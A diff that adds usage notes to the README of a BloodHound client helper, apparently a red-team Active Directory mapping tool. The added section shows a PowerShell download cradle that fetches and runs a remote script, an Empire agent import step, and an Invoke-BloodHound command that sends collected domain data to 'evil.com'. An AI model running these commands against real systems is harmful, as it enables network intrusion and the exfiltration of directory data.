@@ -25,6 +25,38 @@ $ bloodhound-client
 * If there isn't a BloodHound release in `.`, `/opt` or `/usr/local` then it will be downloaded.
 * The BloodHound client will be launched.
 
+### Target
+
+#### Loading
+
+Via download cradle (See https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+for more):
+
+```powershell
+IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1")
+```
+
+Alternatively, from Empire:
+
+```bash
+$ curl -o data/BloodHound.ps1 https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1
+(Empire: AGENT) > scriptimport data/BloodHound.ps1
+```
+
+#### Executing
+
+Use the Neo4j REST API:
+
+```powershell
+Invoke-BloodHound -URI 'https://evil.com:7473' -UserPass 'neo4j:Pa$$w0rd'
+```
+
+Create CSVs to later be uploaded:
+
+```powershell
+Invoke-BloodHound -CSVFolder 'C:\Temp'
+```
+
 
 ## Installation
 
